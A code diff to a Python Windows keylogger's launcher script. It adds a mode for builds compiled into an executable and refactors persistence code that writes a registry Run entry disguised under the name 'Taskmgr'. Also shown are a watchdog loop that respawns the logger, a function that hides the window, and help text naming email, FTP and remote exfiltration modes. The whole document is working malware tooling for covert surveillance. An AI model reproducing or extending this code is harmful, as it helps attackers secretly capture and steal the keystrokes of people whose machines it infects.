@@ -15,7 +15,8 @@ import random
 
 # CONSTANTS
 TIME_TO_SLEEP = 10  # in seconds
-PYTHON_EXEC_PATH = 'python'  # 'C:\\Temp\\python27\\python.exe'
+PYTHON_EXEC_PATH = 'python'  # used only when executable=False.
+# Examples: 'C:\\...\\python.exe' or 'python' if it is on your PATH.
 
 # Disallowing multiple instances
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy_main')
@@ -24,10 +25,9 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     print("Multiple instances are not allowed")
     exit(0)
 
-full_path = os.path.dirname(os.path.realpath(__file__))
-file_name = "logger.py"
-current_file_name = sys.argv[0].split('/')[-1]
-new_file_path = full_path + "\\" + file_name
+current_file_path = os.path.realpath(sys.argv[0])
+dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
+current_file_name = os.path.split(os.path.realpath(sys.argv[0]))[-1]
 
 
 def hide():
@@ -54,31 +54,48 @@ mode:
 
 [optional] startup: add the keylogger to windows startup.
 
-[optional] encrypt: encrypt the logs with a public key provided in logger.py.\n\n""")
+[optional] encrypt: encrypt the logs with a public key provided in logger.py.
+
+[optional] exe: provide this argument before compiling the script into executable using pyinstaller.\n\n""")
     return True
 
 
 # Add to startup for persistence
-def add_to_startup(mode, encryption_on):
+def add_to_startup(mode, encryption_on, executable):
     key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
     key2change = OpenKey(HKEY_CURRENT_USER,
                          key_val, 0, KEY_ALL_ACCESS)
+    if executable:
+        reg_value_prefix, reg_value_postfix = '', ''
+    else:
+        reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + PYTHON_EXEC_PATH + ' '
+        reg_value_postfix = '"'
+    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + ' '.join([mode, 'startup']) + \
+                (' encrypt' if encryption_on else '') + reg_value_postfix
     try:
-        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, 'CMD /k "cd ' + full_path +
-                   ' && ' + PYTHON_EXEC_PATH + ' "' + full_path + '\\' +
-                   current_file_name.replace(full_path + '\\', "") + '" ' + ' '.join([mode, 'startup']) +
-                   (' encrypt' if encryption_on else '') + '"')
+        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, reg_value)
     except Exception as e:
         print(e)
 
 
-def maintain_keylogger_instance(mode, encryption_on):
+def maintain_keylogger_instance(mode, encryption_on, executable):
     new_instance_pid = random.getrandbits(256)          # 256bit number to ensure no collisions
-    if encryption_on:
-        cmdline = [PYTHON_EXEC_PATH, new_file_path, mode, 'encrypt']
+    if executable:
+        file_name = "logger.exe"
     else:
-        cmdline = [PYTHON_EXEC_PATH, new_file_path, mode]
+        file_name = "logger.py"
+    new_file_path = os.path.join(dir_path, file_name)
+    if encryption_on:
+        if executable:
+            cmdline = [new_file_path, mode, 'encrypt']
+        else:
+            cmdline = [PYTHON_EXEC_PATH, new_file_path, mode, 'encrypt']
+    else:
+        if executable:
+            cmdline = [new_file_path, mode]
+        else:
+            cmdline = [PYTHON_EXEC_PATH, new_file_path, mode]
     while True:
         is_running = False
         for process in psutil.process_iter():
@@ -109,17 +126,19 @@ def main():
     mode = [k for k in sys.argv if k in ["local", "remote", "email", "ftp", "debug"]]
     if len(mode) > 0:
         mode = mode[0]
-        encryption_on = False
+        encryption_on, executable = False, False
+        if "exe" in sys.argv:
+            executable = True
         if "encrypt" in sys.argv:
             encryption_on = True
         if "startup" in sys.argv:
-            add_to_startup(mode, encryption_on)
+            add_to_startup(mode, encryption_on, executable)
         # start
         if mode != "debug":
             hide()
         else:
             print(psutil.Process(os.getpid()).parent())
-        maintain_keylogger_instance(mode, encryption_on)
+        maintain_keylogger_instance(mode, encryption_on, executable)
     else:
         msg()
         exit(0)
